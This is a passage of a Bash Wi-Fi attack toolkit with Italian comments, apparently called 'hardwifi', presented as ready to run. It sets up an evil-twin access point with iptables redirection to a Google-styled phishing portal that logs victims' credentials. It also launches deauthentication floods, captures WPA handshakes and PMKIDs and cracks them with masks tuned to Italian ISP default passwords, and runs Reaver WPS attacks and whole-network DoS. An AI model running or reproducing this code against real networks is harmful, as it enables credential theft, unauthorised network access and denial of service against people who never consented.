    # 5. Reset Nucleare IPTables e Forwarding
    echo -e "${BLUE}[*] Reset Nucleare IPTables...${NC}"
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    sudo iptables -F
    sudo iptables -X
    sudo iptables -t nat -F
    sudo iptables -t nat -X
    sudo iptables -P INPUT ACCEPT
    sudo iptables -P FORWARD ACCEPT
    sudo iptables -P OUTPUT ACCEPT
    # Regola REJECT 443 per forzare fallback HTTP
    sudo iptables -A INPUT -p tcp --dport 443 -j REJECT --reject-with tcp-reset
    # Regola DNAT per redirezione forzata porta 80
    sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
    
    # 6. Avvio Portale Phishing (Python Server)
    echo -e "${BLUE}[*] Avvio Python Portal Server su 10.0.0.1:80...${NC}"
    local portal_dir="/home/itan/.gemini/antigravity/scratch/hardwifi/sc_portal"
    cd "$portal_dir" || return
    
    sudo python3 server.py &> portal_error.log &
    PHP_PID=$!
    
    # 7. Real-time Log Viewers
    touch credenziali.txt requests.log
    xterm -hold -geometry 100x20+600+0 -T "CREDENTIALS LOG - EVIL TWIN" -e "tail -f credenziali.txt" &
    LOG_PID=$!
    xterm -hold -geometry 100x20+600+430 -T "REQUESTS LOG - PORTAL" -e "tail -f requests.log" &
    REQS_PID=$!
    
    # 8. Deauth Attack (Opzionale ma suggerito)
    echo -e "${YELLOW}[!] Vuoi lanciare anche un Deauth sull'AP reale per forzare la riconnessione? (S/n)${NC}"
    read -p "> " deauth_confirm
    if [[ "$deauth_confirm" != "n" ]]; then
        echo -e "${BLUE}[*] Lancio Deauth in corso...${NC}"
        xterm -T "DEAUTH - FORCING RECONNECT" -geometry 100x10+0+430 -e "sudo aireplay-ng --deauth 0 -a $BSSID $MON_IFACE" &
        DEAUTH_PID=$!
    fi
    
    echo -e "${GREEN}[V] EVIL TWIN ATTIVO.${NC}"
    echo -e "${YELLOW}La rete fake '$SSID' è ora visibile. Gli utenti che si connettono vedranno il portale Google.${NC}"
    echo -e "${BLUE}--------------------------------------------------------------------------------${NC}"
    read -p "Premi [INVIO] per fermare l'Evil Twin e ripristinare il sistema..."
    
    # Cleanup
    sudo kill $AIRBASE_PID $DNSMASQ_PID $PHP_PID $LOG_PID $DEAUTH_PID 2>/dev/null
    sudo pkill airbase-ng
    sudo pkill dnsmasq
    sudo pkill php
    sudo iptables --flush
    sudo iptables --table nat --flush
    
    # Ripristino placeholder HTML
    sed -i "s/10.0.0.1/IP-ATTACCANTE/g" index.html
    
    cd - > /dev/null
    echo -e "${GREEN}[V] Evil Twin spento e sistema pulito.${NC}"
    sleep 1
}

# === THE CROSSROADS (MENU PRINCIPALE) ===
clear
echo -e "${YELLOW}================================================================${NC}"
echo -e "${GREEN}                  SCEGLI LA MODALITÁ OPERATIVA                  ${NC}"
echo -e "${YELLOW}================================================================${NC}"
echo -e "${GREEN}1)${NC} Normal Mode (Scansione reti e Attacchi Mirati)"
echo -e "${GREEN}2)${NC} The Eye of Sauron (Digital Profiler & WIDS - Ricognizione Passiva)"
echo -e "${GREEN}3)${NC} Local Network Discovery (IP Guesser - Trova dispositivi LAN)"
echo -e "${RED}4)${NC} Deploy Autonomous Drone (Auto-Pwn Sequenziale di Massa) 🛸💀"
echo -e "${RED}5)${NC} THE PARADOX (SSID Beacon Flooder - Radio Chaos) 🌀⚠️"
echo -e "${RED}6)${NC} THE VOID (Global Deauth Storm - Blackout Totale) 🌌💀"
echo -e "${RED}7)${NC} THE OVERLORD (Global Auth-Flood - Bloqueo Accesso) 👑🔥"
echo -e "${RED}8)${NC} THE RAGNAROK (Full Spectrum Apocalypse - Total War) 🌋💀"
echo -e "${RED}10)${NC} THE ARMAGEDDON (End Game Menu - Final Frontier) 🌌💀🔥"
echo -e "${RED}13)${NC} THE OMEGA POINT (10/10 Mastery - Absolute Supremacy) 💎🌌💀"
echo -e "${RED}14)${NC} THE TERMINUS (11/10 Voidwalker - Final Death) 💀🌌🌑"
echo -e "${RED}15)${NC} THE SINGULARITY CORE (The Final Paradox - Beyond Gods) 🌌💎🌀💀"
echo -e "${RED}16)${NC} THE VOID INFINITY (Recursion & Quantum Chaos) 🌀🌌♾️🧪"
echo ""
read -p "Scelta: " main_mode

case "$main_mode" in
    2)
        clear
        echo -e "${YELLOW}Quale Modulo Intelligence vuoi avviare?${NC}"
        echo -e "${GREEN}1)${NC} Digital Profiler (Traccia la storia dei MAC Address nell'area)"
        echo -e "${GREEN}2)${NC} Hacker Hunter WIDS (Rileva Evil Twins e Attacchi Wi-Fi)"
        echo -e "${GREEN}3)${NC} The Ghost Catcher (Smaschera le Reti Wi-Fi Invisibili)"
        echo -e "${GREEN}4)${NC} The Honeypot Trap (Rileva Wi-Fi Pineapples e Karma Attacks)"
        echo -e "${GREEN}5)${NC} Geo-Tracker OSINT (Geolocalizza fisicamente un MAC Address)"
        echo -e "${GREEN}6)${NC} The Fox Hunt (Radar Localizzatore di Segnale Fisico) 🦊📡"
        echo -e "${GREEN}7)${NC} Area-51 (OSINT Wardriving Satellitare Mapper) 🛰️🌍"
        echo ""
        read -p "> " int_choice
        if [[ "$int_choice" == "1" ]]; then
            run_probe_sniffer
        elif [[ "$int_choice" == "2" ]]; then
            run_wids
        elif [[ "$int_choice" == "3" ]]; then
            run_ghost_catcher
        elif [[ "$int_choice" == "4" ]]; then
            run_honeypot
        elif [[ "$int_choice" == "5" ]]; then
            run_geotracker
        elif [[ "$int_choice" == "6" ]]; then
            run_foxhunt
        elif [[ "$int_choice" == "7" ]]; then
            run_area51_mapper
        else
            echo -e "${RED}Scelta non valida.${NC}"
            exit 1
        fi
        exit 0
        ;;
    3)
        run_ip_guesser
        exit 0
        ;;
    4)
        run_autonomous_drone
        exit 0
        ;;
    5)
        run_paradox
        exit 0
        ;;
    6)
        run_the_void
        exit 0
        ;;
    7)
        run_the_overlord
        exit 0
        ;;
    8)
        run_ragnarok
        exit 0
        ;;
    10)
        run_armageddon_menu
        exit 0
        ;;
    13)
        run_omega_menu
        exit 0
        ;;
    14)
        run_terminus_menu
        exit 0
        ;;
    15)
        run_singularity_core_menu
        exit 0
        ;;
    16)
        run_void_infinity_menu
        exit 0
        ;;
    1|*)
        # Continua con il flusso normale (Scansione & Attacchi)
        echo -e "${BLUE}[*] Abilitazione Monitor Mode su $WIFI_IFACE...${NC}"
        airmon-ng start "$WIFI_IFACE" > /dev/null
        MON_IFACE="${WIFI_IFACE}mon"
        
        # Verifica se il nome dell'interfaccia è cambiato (alcuni driver non aggiungono 'mon')
        if ! ip link show "$MON_IFACE" &> /dev/null; then
            MON_IFACE=$WIFI_IFACE
        fi
        ;;
esac

# --- SCANSIONE E SELEZIONE TARGET ---
clear
echo -e "${BLUE}[*] Selezione Frequenze di Scansione:${NC}"
echo -e "${GREEN}1)${NC} 2.4 GHz (Standard)"
echo -e "${GREEN}2)${NC} 5 GHz (High Speed - richiede antenna AC)"
echo -e "${GREEN}3)${NC} Entrambe (Scansione Completa)"
read -p "Scelta [1-3]: " band_choice

case $band_choice in
    2) SCAN_BAND="a"; SCAN_TIME=15; BAND_NAME="5GHz" ;;
    3) SCAN_BAND="abg"; SCAN_TIME=20; BAND_NAME="2.4GHz + 5GHz" ;;
    *) SCAN_BAND="bg"; SCAN_TIME=15; BAND_NAME="2.4GHz" ;;
esac

echo -e "${BLUE}[*] Avvio scansione $BAND_NAME... (Attendi $SCAN_TIME secondi)${NC}"

# Creazione file temporaneo per i risultati della scansione
SCAN_FILE="/tmp/hardwifi_scan"
rm -f ${SCAN_FILE}*

# Avvio airodump-ng in background (scansione silenziosa con banda specifica)
airodump-ng --band "$SCAN_BAND" --write "$SCAN_FILE" --output-format csv "$MON_IFACE" &> /dev/null &
SCAN_PID=$!

# Barra di caricamento
for ((i=1; i<=SCAN_TIME; i++)); do
    echo -ne "${BLUE}#${NC}"
    sleep 1
done
echo -e "\n"

# Ferma la scansione
kill $SCAN_PID 2>/dev/null
sleep 1

# --- PARSING DEI RISULTATI ---
CSV_FILE="${SCAN_FILE}-01.csv"

if [[ ! -f "$CSV_FILE" ]]; then
    echo -e "${RED}ERRORE: Impossibile generare i risultati della scansione.${NC}"
    exit 1
fi

# Estrazione delle reti (SSID, BSSID, CH) dal CSV
# Il formato di airodump CSV ha le reti nella prima parte del file
# Usiamo awk per estrarre BSSID (1), Canale (4), Privacy (6), SSID (14)
echo -e "${BLUE}--------------------------------------------------------------------------------${NC}"
echo -e "${YELLOW}ID\tBSSID\t\t\tCH\tSSID${NC}"
echo -e "${BLUE}--------------------------------------------------------------------------------${NC}"

# Creiamo un array per memorizzare i dati delle reti
mapfile -t networks < <(awk -F, 'NR > 1 {print $1 "|" $4 "|" $14}' "$CSV_FILE" | sed 's/^[ \t]*//;s/[ \t]*$//' | grep -v "^BSSID" | grep -v "^$" | head -n 20)

if [[ ${#networks[@]} -eq 0 ]]; then
    echo -e "${RED}Nessuna rete trovata. Riprova o controlla la tua antenna.${NC}"
    exit 1
fi

# Visualizzazione menu
i=1
for net in "${networks[@]}"; do
    bssid=$(echo "$net" | cut -d'|' -f1)
    channel=$(echo "$net" | cut -d'|' -f2 | xargs)
    ssid=$(echo "$net" | cut -d'|' -f3 | xargs)
    
    # If SSID is empty, mark as hidden
    [[ -z "$ssid" ]] && ssid="<Hidden SSID>"
    
    echo -e "${GREEN}$i)${NC}\t$bssid\t$channel\t$ssid"
    ((i++))
done

echo ""
read -p "Select the network number to attack: " selection

# Selection check
if [[ ! "$selection" =~ ^[0-9]+$ ]] || [[ "$selection" -lt 1 ]] || [[ "$selection" -gt ${#networks[@]} ]]; then
    echo -e "${RED}Invalid selection.${NC}"
    exit 1
fi

# Impostazione variabili target
TARGET_INDEX=$((selection-1))
BSSID=$(echo "${networks[$TARGET_INDEX]}" | cut -d'|' -f1)
CHANNEL=$(echo "${networks[$TARGET_INDEX]}" | cut -d'|' -f2 | xargs)
SSID=$(echo "${networks[$TARGET_INDEX]}" | cut -d'|' -f3 | xargs)

[[ -z "$SSID" ]] && SSID="Hidden_Network"

echo -e "${BLUE}[*] Target selezionato: ${YELLOW}$SSID ($BSSID) sul canale $CHANNEL${NC}"
sleep 1

# --- ATTACK SELECTION ---
clear
echo -e "${YELLOW}Choose attack type for $SSID:${NC}"
echo -e "${GREEN}1)${NC} WPA Handshake (Classic - Requires clients)"
echo -e "${GREEN}2)${NC} PMKID Attack (Modern - Clientless)"
echo -e "${GREEN}3)${NC} WPS Attack (PIN-based - If vulnerable)"
echo -e "${GREEN}4)${NC} WiFi DoS (Continuous Deauth - Disconnect all)"
echo -e "${GREEN}5)${NC} Protocol Surveyor (v10.4 - Continuous mDNS/UPnP monitoring)"
echo -e "${GREEN}6)${NC} Drop-Kick WIPS (Guardian Shield - Block intruders)"
echo -e "${GREEN}7)${NC} The Ghost Rider (MAC Filter Bypass & Identity Hijacking)"
echo -e "${GREEN}8)${NC} Connected Clients Scanner (Show who is connected to target)"
echo -e "${RED}9)${NC} THE SIEGE (Router Hardware Overloader / Freeze) 🏰🔥"
echo -e "${BLUE}10)${NC} SC PORTAL (DNS Redirection Phishing)"
echo -e "${RED}11)${NC} THE EVIL TWIN (Fake AP + Phishing Rescue) 🎭🎣🌋"
echo ""
read -p "Choice: " attack_mode

case $attack_mode in
    1)
        # --- HANDSHAKE CAPTURE ---
        clear
        echo -e "${BLUE}[*] Starting classic Handshake attack...${NC}"
        mkdir -p /tmp/hardwifi_capture
        rm -f /tmp/hardwifi_capture/*.cap

        # 1. Kill interfering processes
        echo -e "${YELLOW}[!] Killing interfering processes (NetworkManager, etc...)...${NC}"
        airmon-ng check kill > /dev/null
        
        # 2. Force Monitor Mode
        if ! iw dev "$MON_IFACE" info | grep -q "type monitor"; then
            echo -e "${YELLOW}[!] Forcing Monitor Mode on $MON_IFACE...${NC}"
            ip link set "$MON_IFACE" down
            iw dev "$MON_IFACE" set type monitor
            ip link set "$MON_IFACE" up
        fi

        # 3. Channel Tuning
        echo -e "${BLUE}[*] Tuning to CH $CHANNEL...${NC}"
        iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null
        iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null

        # 4. Starting Airodump-ng
        echo -e "${BLUE}[*] Opening capture window...${NC}"
        xterm -hold -geometry 100x20+0+0 -T "HANDSHAKE CAPTURE - $SSID" -e airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w "/tmp/hardwifi_capture/$SSID" "$MON_IFACE" & 
        AIRODUMP_PID=$!

        # 5. Starting Deauth
        echo -e "${YELLOW}[!] Launching Deauthentication attacks...${NC}"
        xterm -hold -geometry 100x10+0+430 -T "DEAUTH ATTACK - $SSID" -e aireplay-ng --deauth 0 -a "$BSSID" "$MON_IFACE" &
        DEAUTH_PID=$!

        echo -e "${YELLOW}--------------------------------------------------------------------------------${NC}"
        echo -e "Wait for 'WPA handshake' to appear in the top-right of the capture window.${NC}"
        echo -e "${YELLOW}--------------------------------------------------------------------------------${NC}"
        read -p "When you see the handshake, press [ENTER] here to stop and crack..."

        kill $AIRODUMP_PID $DEAUTH_PID 2>/dev/null

        # --- DEVICE REPORT ---
        show_captured_clients "$BSSID" "$SSID"
        read -p "Press [ENTER] to proceed to cracking..."

        # --- CRACKING PHASE ---
        clear
        echo -e "${BLUE}[*] Checking and starting offline cracking...${NC}"
        CAP_FILE=$(ls "/tmp/hardwifi_capture/$SSID"*.cap 2>/dev/null | tail -n 1)

        if [[ ! -f "$CAP_FILE" ]]; then
            echo -e "${RED}ERROR: Capture file not found.${NC}"
            exit 1
        fi

        # Check for handshake
        if ! aircrack-ng "$CAP_FILE" | grep -q "1 handshake"; then
            echo -e "${RED}ERROR: No handshake found in captured file.${NC}"
            echo -e "${YELLOW}Make sure a device was connected and you saw the 'WPA handshake' message.${NC}"
            exit 1
        fi

        # SCELTA ENGINE E WORDLIST
        select_wordlist
        
        echo -e "\n${YELLOW}Scegli il motore di cracking:${NC}"
        echo -e "1) Aircrack-ng (CPU)"
        echo -e "2) Hashcat (GPU - Consigliato)"
        read -p "Engine: " cracking_engine

        if [[ "$cracking_engine" == "2" ]]; then
            echo -e "${BLUE}[*] Conversione formato .cap -> .hc22000...${NC}"
            HASH_FILE="/tmp/hardwifi_capture/$SSID.hc22000"
            hcxpcapngtool -o "$HASH_FILE" "$CAP_FILE" > /dev/null
            echo -e "${BLUE}[*] Lancio Hashcat...${NC}"
            
            case "$WORDLIST" in
                "PATTERN_TIM") mask="?u?u?u?u?u?u?u?u?u?u" ;; # 10 upper (TIM spesso usa maiuscole/numeri)
                "PATTERN_VODAFONE") mask="?h?h?h?h?h?h?h?h?h?h?h?h?h?h" ;; # 14 hex
                "PATTERN_FASTWEB") mask="?l?l?l?l?l?l?l?l?l?l" ;; # 10 lower
                *) mask="" ;;
            esac

            if [[ -n "$mask" ]]; then
                hashcat -m 22000 "$HASH_FILE" -a 3 "$mask" --quiet --potfile-disable &
            else
                hashcat -m 22000 "$HASH_FILE" "$WORDLIST" --quiet --potfile-disable &
            fi
            HASHCAT_PID=$!
            wait $HASHCAT_PID
            if [[ -n "$mask" ]]; then
                CRACK_OUTPUT=$(hashcat -m 22000 "$HASH_FILE" -a 3 "$mask" --show --potfile-disable)
            else
                CRACK_OUTPUT=$(hashcat -m 22000 "$HASH_FILE" "$WORDLIST" --show --potfile-disable)
            fi
        else
            echo -e "${BLUE}[*] Lancio Aircrack-ng...${NC}"
            case "$WORDLIST" in
                "PATTERN_TIM") crunch 10 10 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng -b "$BSSID" -w - "$CAP_FILE" | tee /tmp/crack_result.txt ;;
                "PATTERN_VODAFONE") crunch 14 14 0123456789ABCDEF | aircrack-ng -b "$BSSID" -w - "$CAP_FILE" | tee /tmp/crack_result.txt ;;
                "PATTERN_FASTWEB") crunch 10 10 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -b "$BSSID" -w - "$CAP_FILE" | tee /tmp/crack_result.txt ;;
                *) aircrack-ng -b "$BSSID" -w "$WORDLIST" "$CAP_FILE" | tee /tmp/crack_result.txt ;;
            esac
            CRACK_OUTPUT=$(cat /tmp/crack_result.txt)
        fi
        ;;

    2)
        # --- PMKID ATTACK ---
        clear
        echo -e "${BLUE}[*] Starting PMKID attack (Clientless)...${NC}"
        mkdir -p /tmp/hardwifi_capture
        HASH_FILE="/tmp/hardwifi_capture/${SSID}.pcapng"
        CLEAN_HASH="/tmp/hardwifi_capture/${SSID}.hc22000"
        
        echo -e "${YELLOW}[!] Killing interfering processes...${NC}"
        airmon-ng check kill > /dev/null

        # 2. Force Monitor Mode
        if ! iw dev "$MON_IFACE" info | grep -q "type monitor"; then
            echo -e "${YELLOW}[!] Forcing Monitor Mode on $MON_IFACE...${NC}"
            ip link set "$MON_IFACE" down
            iw dev "$MON_IFACE" set type monitor
            ip link set "$MON_IFACE" up
        fi

        # 3. Channel Tuning
        echo -e "${BLUE}[*] Tuning to CH $CHANNEL...${NC}"
        iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null
        iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null

        echo -e "${YELLOW}[!] Attempting PMKID capture for 60 seconds...${NC}"
        echo -ne "${BLUE}Waiting... ${NC}"
        
        timeout 60s hcxdumptool -i "$MON_IFACE" -o "$HASH_FILE" --enable_status=1 &
        HCXDUMP_PID=$!
        sleep 60
        kill $HCXDUMP_PID 2>/dev/null

        if [[ ! -f "$HASH_FILE" ]]; then
            echo -e "${RED}ERROR: No PMKID data captured.${NC}"
            exit 1
        fi

        # SCELTA ENGINE E WORDLIST
        select_wordlist

        echo -e "\n${YELLOW}Scegli il motore di cracking:${NC}"
        echo -e "1) Aircrack-ng (CPU)"
        echo -e "2) Hashcat (GPU - Consigliato)"
        read -p "Engine: " cracking_engine

        if [[ "$cracking_engine" == "2" ]]; then
            echo -e "${BLUE}[*] Conversione formato .pcapng -> .hc22000...${NC}"
            hcxpcapngtool -o "$CLEAN_HASH" "$HASH_FILE" > /dev/null 2>&1
            if [[ ! -f "$CLEAN_HASH" ]]; then echo -e "${RED}Errore conversione.${NC}"; exit 1; fi
            echo -e "${BLUE}[*] Lancio Hashcat...${NC}"
            
            case "$WORDLIST" in
                "PATTERN_TIM") mask="?u?u?u?u?u?u?u?u?u?u" ;;
                "PATTERN_VODAFONE") mask="?h?h?h?h?h?h?h?h?h?h?h?h?h?h" ;;
                "PATTERN_FASTWEB") mask="?l?l?l?l?l?l?l?l?l?l" ;;
                *) mask="" ;;
            esac

            if [[ -n "$mask" ]]; then
                hashcat -m 22000 "$CLEAN_HASH" -a 3 "$mask" --quiet --potfile-disable &
            else
                hashcat -m 22000 "$CLEAN_HASH" "$WORDLIST" --quiet --potfile-disable &
            fi
            HASHCAT_PID=$!
            wait $HASHCAT_PID
            if [[ -n "$mask" ]]; then
                CRACK_OUTPUT=$(hashcat -m 22000 "$CLEAN_HASH" -a 3 "$mask" --show --potfile-disable)
            else
                CRACK_OUTPUT=$(hashcat -m 22000 "$CLEAN_HASH" "$WORDLIST" --show --potfile-disable)
            fi
        else
            echo -e "${BLUE}[*] Tentativo di cracking PMKID con Aircrack-ng...${NC}"
            case "$WORDLIST" in
                "PATTERN_TIM") crunch 10 10 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng -b "$BSSID" -w - "$HASH_FILE" | tee /tmp/crack_result.txt ;;
                "PATTERN_VODAFONE") crunch 14 14 0123456789ABCDEF | aircrack-ng -b "$BSSID" -w - "$HASH_FILE" | tee /tmp/crack_result.txt ;;
                "PATTERN_FASTWEB") crunch 10 10 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -b "$BSSID" -w - "$HASH_FILE" | tee /tmp/crack_result.txt ;;
                *) aircrack-ng -b "$BSSID" -w "$WORDLIST" "$HASH_FILE" | tee /tmp/crack_result.txt ;;
            esac
            CRACK_OUTPUT=$(cat /tmp/crack_result.txt)
        fi
        ;;

    3)
        # --- WPS ATTACK ---
        clear
        echo -e "${BLUE}[*] Starting WPS attack with Reaver...${NC}"
        echo -e "${YELLOW}[!] Ensuring WPS is active (wash scan in progress...)${NC}"
        
        # 1. Kill interfering processes
        echo -e "${YELLOW}[!] Killing interfering processes...${NC}"
        airmon-ng check kill > /dev/null

        # 2. Force Monitor Mode
        if ! iw dev "$MON_IFACE" info | grep -q "type monitor"; then
            echo -e "${YELLOW}[!] Forcing Monitor Mode on $MON_IFACE...${NC}"
            ip link set "$MON_IFACE" down
            iw dev "$MON_IFACE" set type monitor
            ip link set "$MON_IFACE" up
        fi

        # 3. Channel Tuning
        echo -e "${BLUE}[*] Tuning to CH $CHANNEL...${NC}"
        iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null
        iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null

        xterm -T "WPS SCAN - WASH" -e "wash -i $MON_IFACE -c $CHANNEL" &
        WASH_PID=$!
        read -p "Check the 'WASH' window. If you see your network with 'Lck: No', press [ENTER] to start Reaver..."
        kill $WASH_PID 2>/dev/null

        echo -e "${BLUE}[*] Launching Reaver...${NC}"
        xterm -hold -T "REAVER ATTACK - $SSID" -e "reaver" "-i" "$MON_IFACE" "-b" "$BSSID" "-vv" &
        REAVER_PID=$!
        
        echo -e "${YELLOW}Reaver is running in a new window.${NC}"
        echo -e "Wait for it to find PIN and Password."
        read -p "Press [ENTER] here when finished to cleanup..."
        exit
        ;;
    4)
        # --- DOS ATTACK (DEAUTH) ---
        clear
        echo -e "${RED}!!! WARNING: WiFi DoS Mode Activated !!!${NC}"
        echo -e "${YELLOW}This mode will constantly disconnect devices from the network.${NC}"
        echo ""
        echo -e "1) Total Attack (Disconnect ALL devices)"
        echo -e "2) Targeted Attack (Disconnect a specific client)"
        read -p "Choose mode: " dos_choice

        # Kill interfering processes
        echo -e "${YELLOW}[!] Killing interfering processes...${NC}"
        airmon-ng check kill > /dev/null

        # Tuning
        iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null

        if [[ "$dos_choice" == "2" ]]; then
            read -p "Enter Target Client MAC Address: " TARGET_CLIENT
            echo -e "${BLUE}[*] Starting targeted DoS against $TARGET_CLIENT...${NC}"
            xterm -T "DOS ATTACK - Target: $TARGET_CLIENT" -geom 100x15 -e "aireplay-ng --deauth 0 -a $BSSID -c $TARGET_CLIENT $MON_IFACE" &
        else
            echo -e "${BLUE}[*] Starting Total DoS on $SSID ($BSSID)...${NC}"
            xterm -T "DOS ATTACK - Target: ALL" -geom 100x15 -e "aireplay-ng --deauth 0 -a $BSSID $MON_IFACE" &
        fi
        DEAUTH_PID=$!

        echo -e "\n${RED}ATTACK IN PROGRESS...${NC}"
        echo -e "The network will remain unusable until you stop the attack."
        read -p "Press [ENTER] to stop DoS and exit script..."
        exit
        ;;
    5)
        # --- CONTINUOUS PROTOCOL SURVEYOR v10.4 ---
        clear
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo -e "${RED}               PROTOCOL SURVEYOR v10.4 – Continuous Monitoring                  ${NC}"
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo ""

        NETWORK_RANGE=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | grep -v '172.17' | head -n1)
        if [[ -z "$NETWORK_RANGE" ]]; then
            echo -e "${YELLOW}Enter network range manually (e.g.: 192.168.1.0/24):${NC}"
            read -p "> " NETWORK_RANGE
        fi

        echo -e "${BLUE}[*] Network detected: ${YELLOW}$NETWORK_RANGE${NC}"
        echo -e "${BLUE}[*] Starting continuous monitoring... (Ctrl+C to stop)${NC}"
        echo ""

        while true; do
            echo -e "${BLUE}[*] Scansione in corso alle $(date +%H:%M:%S)...${NC}"
            
            # Discovery rapido
            HOSTS=$(nmap -sn "$NETWORK_RANGE" 2>/dev/null | grep 'Nmap scan report' | awk '{print $NF}' | tr -d '()')
            
            if [[ -z "$HOSTS" ]]; then
                echo -e "${YELLOW}[!] Nessun host trovato. Riprovo tra 30 secondi...${NC}"
                sleep 30
                continue
            fi

            echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
            printf "${YELLOW}%-15s | %-20s | %-12s | %-35s${NC}\n" "IP ADDRESS" "DEVICE NAME (mDNS)" "PORTA" "INFO / VULN (UPnP/SNMP)"
            echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

            echo "$HOSTS" | while read -r HOST_IP; do
                [[ -z "$HOST_IP" ]] && continue
                
                # mDNS Resolution (Cerchiamo il nome del dispositivo)
                DEVICE_NAME=$(nmap -sV -p 5353 --script dns-service-discovery "$HOST_IP" 2>/dev/null | grep -A 1 'dns-service-discovery' | grep 'Name:' | cut -d':' -f2 | xargs)
                [[ -z "$DEVICE_NAME" ]] && DEVICE_NAME="(Sconosciuto)"

                # UPnP / SNMP / Ports Check
                # Facciamo una scansione mirata per protocolli "chiacchieroni"
                EXTRA_SCAN=$(nmap -sV -p 161,1900,5353,80,443 --script upnp-info,snmp-info "$HOST_IP" 2>/dev/null)
                
                # Parsing info UPnP
                UPNP_INFO=$(echo "$EXTRA_SCAN" | grep -i 'modelName' | cut -d':' -f2 | xargs | head -n1)
                [[ -z "$UPNP_INFO" ]] && UPNP_INFO=$(echo "$EXTRA_SCAN" | grep '/tcp' | grep 'open' | head -n1 | awk '{print $3}' | xargs)
                [[ -z "$UPNP_INFO" ]] && UPNP_INFO="Nessuna info aggiuntiva"

                # Stampa riga report
                printf "${GREEN}%-15s${NC} | ${BLUE}%-20s${NC} | ${RED}%-12s${NC} | %-35s\n" "$HOST_IP" "$DEVICE_NAME" "Multi" "$UPNP_INFO"

                # Check Bug Bounty Alert (Esempio: dnsmasq vecchio)
                if echo "$EXTRA_SCAN" | grep -qi "dnsmasq 2.51"; then
                    echo -e "   ${RED}⚠️ [BUG BOUNTY ALERT] Trovato dnsmasq 2.51 su $HOST_IP! Possibile RCE!${NC}"
                fi
            done

            echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
            echo -e "${YELLOW}[*] Prossimo aggiornamento tra 60 secondi...${NC}"
            sleep 60
            clear
        echo -e "${RED}PROTOCOL SURVEYOR v10.4 – Monitoraggio in corso...${NC}"
        done
        ;;
    6)
        # --- DROP-KICK WIPS (SCUDO BUTTAFUORI) ---
        run_dropkick
        ;;
    7)
        # --- GHOST RIDER (MAC HIJACKING) ---
        run_ghost_rider
        ;;
    8)
        # --- CONNECTED CLIENTS SCANNER ---
        run_client_scanner
        ;;
    9)
        # --- THE SIEGE (ROUTER FREEZE) ---
        run_the_siege
        ;;
    10)
        # --- SC PORTAL (GOOGLE PHISHING) ---
        run_sc_portal
        ;;
    11)
        # --- THE EVIL TWIN ---
        run_evil_twin
        ;;
    *)
        echo -e "${RED}Invalid choice.${NC}"
        exit 1
        ;;
esac

# PASSWORD AND VAULT PARSING
FOUND=false
if echo "$CRACK_OUTPUT" | grep -q "KEY FOUND!" || [[ -n "$CRACK_OUTPUT" && "$cracking_engine" == "2" && "$CRACK_OUTPUT" =~ ":" ]]; then
    if [[ "$cracking_engine" == "2" ]]; then
        # Parsing Hashcat
        PASSWORD=$(echo "$CRACK_OUTPUT" | rev | cut -d':' -f1 | rev | xargs)
    else
        # Parsing Aircrack-ng
        PASSWORD=$(echo "$CRACK_OUTPUT" | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' | grep "KEY FOUND!" | sed 's/.*\[ \(.*\) \].*/\1/; s/.*KEY FOUND! [\(.*\)].*/\1/; s/.*KEY FOUND! : \(.*\)/\1/' | xargs)
    fi
    
    echo -e "\n${YELLOW}##################################################${NC}"
    echo -e "${RED}PASSWORD FOUND! The password is: ${YELLOW}$PASSWORD${NC}"
    echo -e "${YELLOW}##################################################${NC}"
    
    FOUND=true
else
    echo -e "\n${GREEN}PASSWORD NOT FOUND IN DICTIONARY.${NC}"
fi

